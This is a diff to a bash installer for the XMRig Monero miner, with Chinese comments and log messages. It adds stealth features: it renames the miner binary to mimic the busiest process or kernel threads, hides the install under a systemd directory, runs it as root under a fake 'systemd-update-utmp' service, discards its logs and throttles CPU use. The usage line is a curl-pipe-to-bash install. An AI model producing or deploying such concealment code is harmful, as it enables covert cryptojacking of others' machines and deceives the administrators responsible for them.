@@ -33,21 +33,110 @@ log_debug() {
     echo -e "${BLUE}[DEBUG]${NC} $1"
 }
 
+# 获取伪装进程名
+get_disguise_name() {
+    # 获取CPU占用最高的进程名
+    local top_process=$(ps aux --no-headers | sort -rn -k3 | head -1 | awk '{print $11}' | sed 's/.*\///')
+    
+    # 如果获取失败或为空，使用备选系统进程名
+    if [ -z "$top_process" ] || [ "$top_process" = "ps" ] || [ "$top_process" = "sort" ]; then
+        local system_processes=("systemd" "kthreadd" "ksoftirqd/0" "migration/0" "rcu_gp" "rcu_par_gp" "kworker/0:0H" "mm_percpu_wq" "ksoftirqd/1" "migration/1" "rcu_sched" "watchdog/0")
+        top_process=${system_processes[$RANDOM % ${#system_processes[@]}]}
+    fi
+    
+    echo "$top_process"
+}
+
+# 创建隐藏目录
+create_hidden_dirs() {
+    log_info "创建隐藏安装目录..."
+    
+    # 使用深层系统目录
+    WORK_DIR="/usr/lib/systemd/system-generators/.cache/systemd-update-utmp"
+    
+    # 创建目录结构
+    mkdir -p "$WORK_DIR"
+    
+    # 设置目录权限
+    chmod 755 "$WORK_DIR"
+    chmod 755 "/usr/lib/systemd/system-generators/.cache"
+    
+    log_info "工作目录: $WORK_DIR"
+}
+
 # 检查参数
 if [ $# -lt 2 ]; then
     log_error "参数不足！"
-    echo "使用方法: curl -s -L x.x/miner.sh | LC_ALL=en_US.UTF-8 bash -s 钱包地址 矿池域名:端口"
-    echo "示例: curl -s -L x.x/miner.sh | LC_ALL=en_US.UTF-8 bash -s 4xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx pool.supportxmr.com:443"
+    echo "使用方法: curl -s -L x.x/miner.sh | LC_ALL=en_US.UTF-8 bash -s 钱包地址 矿池域名:端口 [CPU利用率%]"
+    echo "示例: curl -s -L x.x/miner.sh | LC_ALL=en_US.UTF-8 bash -s 4xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx pool.supportxmr.com:443 50"
+    echo "CPU利用率参数可选，默认使用所有CPU核心，设置50表示使用50%的CPU核心"
     exit 1
 fi
 
 # 参数解析
 WALLET_ADDRESS="$1"
 POOL_ADDRESS="$2"
+CPU_USAGE="${3:-100}"  # 默认100%使用所有核心
+
+# 验证CPU利用率参数
+if ! [[ "$CPU_USAGE" =~ ^[0-9]+$ ]] || [ "$CPU_USAGE" -lt 1 ] || [ "$CPU_USAGE" -gt 100 ]; then
+    log_error "CPU利用率参数无效！请输入1-100之间的数字"
+    exit 1
+fi
 
 log_info "开始XMR挖矿脚本安装..."
 log_info "钱包地址: $WALLET_ADDRESS"
 log_info "矿池地址: $POOL_ADDRESS"
+log_info "CPU利用率: ${CPU_USAGE}%"
+
+# 检测CPU核心数和计算绑定
+detect_cpu_info() {
+    log_info "检测CPU信息..."
+    
+    # 获取CPU核心数
+    if command -v lscpu >/dev/null 2>&1; then
+        TOTAL_CORES=$(lscpu | grep "^CPU(s):" | awk '{print $2}')
+    elif [ -f /proc/cpuinfo ]; then
+        TOTAL_CORES=$(grep -c "^processor" /proc/cpuinfo)
+    else
+        log_warn "无法检测CPU核心数，使用默认值4"
+        TOTAL_CORES=4
+    fi
+    
+    # 验证核心数
+    if ! [[ "$TOTAL_CORES" =~ ^[0-9]+$ ]] || [ "$TOTAL_CORES" -lt 1 ]; then
+        log_warn "CPU核心数检测异常，使用默认值4"
+        TOTAL_CORES=4
+    fi
+    
+    # 计算需要使用的核心数
+    USED_CORES=$(( (TOTAL_CORES * CPU_USAGE + 99) / 100 ))  # 向上取整
+    
+    # 确保至少使用1个核心
+    if [ "$USED_CORES" -lt 1 ]; then
+        USED_CORES=1
+    fi
+    
+    # 确保不超过总核心数
+    if [ "$USED_CORES" -gt "$TOTAL_CORES" ]; then
+        USED_CORES=$TOTAL_CORES
+    fi
+    
+    log_info "CPU总核心数: $TOTAL_CORES"
+    log_info "设置使用核心数: $USED_CORES (${CPU_USAGE}%)"
+    
+    # 生成CPU绑定列表 (0到USED_CORES-1)
+    CPU_AFFINITY=""
+    for ((i=0; i<USED_CORES; i++)); do
+        if [ -z "$CPU_AFFINITY" ]; then
+            CPU_AFFINITY="$i"
+        else
+            CPU_AFFINITY="$CPU_AFFINITY,$i"
+        fi
+    done
+    
+    log_info "CPU绑定列表: $CPU_AFFINITY"
+}
 
 # 检测系统架构和操作系统
 detect_system() {
@@ -230,9 +319,8 @@ install_missing_dependencies() {
 download_and_install() {
     log_info "下载和安装XMRig..."
     
-    # 创建工作目录
-    WORK_DIR="/opt/xmrig"
-    mkdir -p "$WORK_DIR"
+    # 创建隐藏目录
+    create_hidden_dirs
     cd "$WORK_DIR"
     
     # 下载文件
@@ -261,7 +349,12 @@ download_and_install() {
     # 设置执行权限
     chmod +x xmrig
     
-    log_info "XMRig安装完成"
+    # 进程名称伪装
+    log_info "设置进程伪装..."
+    mv xmrig "$DISGUISE_NAME"
+    ln -sf "$DISGUISE_NAME" xmrig
+    
+    log_info "XMRig安装完成，进程已伪装为: $DISGUISE_NAME"
 }
 
 # 创建配置文件
@@ -310,11 +403,12 @@ create_config() {
         "priority": null,
         "memory-pool": false,
         "yield": true,
-        "max-threads-hint": null,
+        "max-threads-hint": $USED_CORES,
         "asm": true,
         "argon2-impl": null,
         "cn/0": false,
-        "cn-lite/0": false
+        "cn-lite/0": false,
+        "affinity": [$CPU_AFFINITY]
     },
     "opencl": {
         "enabled": false,
@@ -388,20 +482,23 @@ EOF
 create_systemd_service() {
     log_info "创建systemd服务..."
     
-    cat > /etc/systemd/system/xmrig.service << EOF
+    SERVICE_NAME="systemd-update-utmp"
+    
+    cat > /etc/systemd/system/${SERVICE_NAME}.service << EOF
 [Unit]
-Description=XMRig Monero Miner
+Description=Update UTMP about System Runlevel Changes
 After=network.target
 
 [Service]
 Type=simple
 User=root
 WorkingDirectory=$WORK_DIR
-ExecStart=$WORK_DIR/xmrig --config=$WORK_DIR/config.json
+ExecStart=$WORK_DIR/$DISGUISE_NAME --config=$WORK_DIR/config.json
 Restart=always
 RestartSec=10
-StandardOutput=journal
-StandardError=journal
+StandardOutput=null
+StandardError=null
+SyslogIdentifier=systemd-update-utmp
 
 [Install]
 WantedBy=multi-user.target
@@ -411,7 +508,7 @@ EOF
     systemctl daemon-reload
     
     # 启用服务
-    systemctl enable xmrig.service
+    systemctl enable ${SERVICE_NAME}.service
     
     log_info "systemd服务创建完成"
 }
@@ -420,44 +517,48 @@ EOF
 create_sysv_service() {
     log_info "创建SysV init脚本..."
     
-    cat > /etc/init.d/xmrig << 'EOF'
+    SERVICE_NAME="systemd-update-utmp"
+    
+    cat > /etc/init.d/$SERVICE_NAME << EOF
 #!/bin/bash
-# xmrig        XMRig Monero Miner
+# $SERVICE_NAME        Update UTMP about System Runlevel Changes
 # chkconfig: 35 99 99
-# description: XMRig Monero Miner
+# description: Update UTMP about System Runlevel Changes
 #
 
 . /etc/rc.d/init.d/functions
 
 USER="root"
-DAEMON="xmrig"
-ROOT_DIR="/opt/xmrig"
+DAEMON="$DISGUISE_NAME"
+ROOT_DIR="$WORK_DIR"
 
-SERVER="$ROOT_DIR/$DAEMON"
-LOCK_FILE="/var/lock/subsys/xmrig"
+SERVER="\$ROOT_DIR/\$DAEMON"
+LOCK_FILE="/var/lock/subsys/$SERVICE_NAME"
 
 do_start() {
-    if [ ! -f "$LOCK_FILE" ] ; then
-        echo -n $"Starting $DAEMON: "
-        runuser -l "$USER" -c "$SERVER --config=$ROOT_DIR/config.json" && echo_success || echo_failure
-        RETVAL=$?
+    if [ ! -f "\$LOCK_FILE" ] ; then
+        echo -n \$"Starting \$DAEMON: "
+        runuser -l "\$USER" -c "\$SERVER --config=\$ROOT_DIR/config.json" && echo_success || echo_failure
+        RETVAL=\$?
         echo
-        [ $RETVAL -eq 0 ] && touch $LOCK_FILE
+        [ \$RETVAL -eq 0 ] && touch \$LOCK_FILE
     else
-        echo "$DAEMON is locked."
+        echo "\$DAEMON is locked."
     fi
 }
 do_stop() {
-    echo -n $"Shutting down $DAEMON: "
-    pid=`ps -aefw | grep "$DAEMON" | grep -v " grep " | awk '{print $2}'`
-    kill -9 $pid > /dev/null 2>&1
-    [ $? -eq 0 ] && echo_success || echo_failure
-    RETVAL=$?
+    echo -n \$"Shutting down \$DAEMON: "
+    pid=\$(ps -aefw | grep "\$DAEMON" | grep -v " grep " | awk '{print \$2}')
+    kill -9 \$pid > /dev/null 2>&1
+    # Also kill any xmrig processes
+    pkill -f "xmrig" > /dev/null 2>&1
+    [ \$? -eq 0 ] && echo_success || echo_failure
+    RETVAL=\$?
     echo
-    [ $RETVAL -eq 0 ] && rm -f $LOCK_FILE
+    [ \$RETVAL -eq 0 ] && rm -f \$LOCK_FILE
 }
 
-case "$1" in
+case "\$1" in
     start)
         do_start
         ;;
@@ -469,21 +570,21 @@ case "$1" in
         do_start
         ;;
     *)
-        echo "Usage: $0 {start|stop|restart}"
+        echo "Usage: \$0 {start|stop|restart}"
         RETVAL=1
 esac
 
-exit $RETVAL
+exit \$RETVAL
 EOF
     
-    chmod +x /etc/init.d/xmrig
+    chmod +x /etc/init.d/$SERVICE_NAME
     
     # 添加到启动项
     if command -v chkconfig >/dev/null 2>&1; then
-        chkconfig --add xmrig
-        chkconfig xmrig on
+        chkconfig --add $SERVICE_NAME
+        chkconfig $SERVICE_NAME on
     elif command -v update-rc.d >/dev/null 2>&1; then
-        update-rc.d xmrig defaults
+        update-rc.d $SERVICE_NAME defaults
     fi
     
     log_info "SysV init脚本创建完成"
@@ -507,10 +608,10 @@ start_mining() {
     log_info "启动挖矿服务..."
     
     if command -v systemctl >/dev/null 2>&1; then
-        systemctl start xmrig.service
-        systemctl status xmrig.service --no-pager
+        systemctl start ${SERVICE_NAME}.service
+        systemctl status ${SERVICE_NAME}.service --no-pager
     else
-        service xmrig start
+        service $SERVICE_NAME start
     fi
     
     log_info "挖矿服务已启动"
@@ -524,25 +625,26 @@ show_status() {
     log_info "安装目录: $WORK_DIR"
     log_info "钱包地址: $WALLET_ADDRESS"
     log_info "矿池地址: $POOL_ADDRESS"
-
     log_info "捐赠设置: 0%"
+    log_info "进程名称: $DISGUISE_NAME"
+    log_info "服务名称: $SERVICE_NAME"
     echo
     log_info "=== 管理命令 ==="
     if command -v systemctl >/dev/null 2>&1; then
-        log_info "查看状态: systemctl status xmrig"
-        log_info "停止挖矿: systemctl stop xmrig"
-        log_info "启动挖矿: systemctl start xmrig"
-        log_info "重启挖矿: systemctl restart xmrig"
-        log_info "查看日志: journalctl -u xmrig -f"
+        log_info "查看状态: systemctl status $SERVICE_NAME"
+        log_info "停止挖矿: systemctl stop $SERVICE_NAME"
+        log_info "启动挖矿: systemctl start $SERVICE_NAME"
+        log_info "重启挖矿: systemctl restart $SERVICE_NAME"
+        log_info "查看日志: journalctl -u $SERVICE_NAME -f"
     else
-        log_info "查看状态: service xmrig status"
-        log_info "停止挖矿: service xmrig stop"
-        log_info "启动挖矿: service xmrig start"
-        log_info "重启挖矿: service xmrig restart"
+        log_info "查看状态: service $SERVICE_NAME status"
+        log_info "停止挖矿: service $SERVICE_NAME stop"
+        log_info "启动挖矿: service $SERVICE_NAME start"
+        log_info "重启挖矿: service $SERVICE_NAME restart"
     fi
     echo
     log_info "配置文件: $WORK_DIR/config.json"
-    log_info "手动运行: cd $WORK_DIR && ./xmrig --config=config.json"
+    log_info "手动运行: cd $WORK_DIR && ./$DISGUISE_NAME --config=config.json"
 }
 
 # 主函数
@@ -553,7 +655,15 @@ main() {
         exit 1
     fi
     
+    # 获取伪装名称
+    DISGUISE_NAME=$(get_disguise_name)
+    SERVICE_NAME="systemd-update-utmp"
+    
+    log_info "进程将伪装为: $DISGUISE_NAME"
+    log_info "服务将命名为: $SERVICE_NAME"
+    
     # 执行安装步骤
+    detect_cpu_info
     detect_system
     set_version
     get_download_url
